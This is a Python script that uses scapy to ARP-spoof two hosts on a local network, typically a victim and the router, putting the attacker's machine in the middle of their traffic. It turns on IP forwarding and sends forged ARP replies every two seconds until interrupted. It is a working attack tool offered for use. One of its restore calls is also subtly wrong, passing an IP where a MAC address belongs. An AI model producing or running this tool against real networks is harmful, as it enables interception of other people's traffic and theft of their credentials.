#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse
import subprocess
import re
from termcolor import colored
import os


def input_validation():
    """
    Control the arguments
    """
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', '--ip-target', dest='ip_target', required=True,
                        help='One of the two ip to spoof.')
    parser.add_argument('-d', '--ip-destination', dest='ip_destination', required=True,
                        help='One of the two ip to spoof. Usually set the router.')

    args = parser.parse_args()

    if not ip_validation(args.ip_target) or not ip_validation(args.ip_destination):
        print(f'{colored("[-]", "red")} Detected an invalid ip format.')
        quit()

    return args


def ip_validation(ip):
    """
    Validate an IP
        Parameters:
            ip: the IP
    """
    if not re.match(r'^(((25[0-5])|(2[0-4][0-9])|(1[0-9][0-9])|([0-9][0-9])|([0-9]))(\.((25[0-5])|(2[0-4][0-9])|(1[0-9][0-9])|([0-9][0-9])|([0-9]))){3})$', ip):
        return False
    return True


def get_mac(ip):
    """
    Get the MAC address of a specific IP
        Parameter:
            ip: the IP address to spoof
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    try:
        return answer_list[0][1].hwsrc
    except IndexError:
        return None


def spoof(target_ip, target_mac, spoof_ip):
    """
    Spoofing our target
        Parameters:
            target_ip: victim IP
            target_mac: victim MAC
            spoof_ip: the IP address who spoof the MAC
    """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, destination_mac, source_ip, source_mac):
    """
    Restore the correct mac address
        Parameters:
            destination_ip: who need to know the real MAC
            destination_mac: his MAC address
            source_ip: the IP who was spoof
            source_mac: the real MAC address of spoofed IP
    """
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def set_ip_forward(activate=True):
    """
    Change ip_forward status
        Parameters:
            activate (bool): if True you'll set to 1 instead to 0
    """
    if activate:
        subprocess.call(['sysctl', 'net.ipv4.ip_forward=1'])
    else:
        subprocess.call(['sysctl', 'net.ipv4.ip_forward=0'])


if __name__ == '__main__':
    if os.geteuid() == 0:
        changed = False
        try:
            args = input_validation()

            print(f'{colored("[+]", "green")} Changing ip forward..')
            set_ip_forward()
            changed = True

            ip_target = args.ip_target
            mac_target = get_mac(ip_target)
            ip_destination = args.ip_destination
            mac_destination = get_mac(ip_destination)

            if not mac_target or not mac_destination:
                print(f'{colored("[-]", "red")} Unable to get mac address..')
                quit()

            print(f'{colored("[+]", "green")} The target machines ( {ip_target} - {mac_target} ) and ( {ip_destination} - {mac_destination} ).\n')

            sent_packets_count = 0
            while True:
                spoof(ip_target, mac_target, ip_destination)
                spoof(ip_destination, mac_destination, ip_target)
                sent_packets_count += 2
                print(f'\r{colored("[+]", "green")} Packets sent: {str(sent_packets_count)}', end='')
                time.sleep(2)
        except KeyboardInterrupt:
            print(f'\n\n{colored("[+]", "green")} Detected CTRL + C ... Quitting.')
            restore(ip_target, mac_target, ip_destination, mac_destination)
            restore(ip_destination, mac_destination, ip_target, ip_target)
        except Exception as ex:
            print(f'{colored("[-]", "red")} {ex}')
        finally:
            if changed:
                print(f'{colored("[+]", "green")} Restoring ip forward..')
                set_ip_forward(False)
    else:
        print(f'{colored("[-]", "red")} You must to be root')
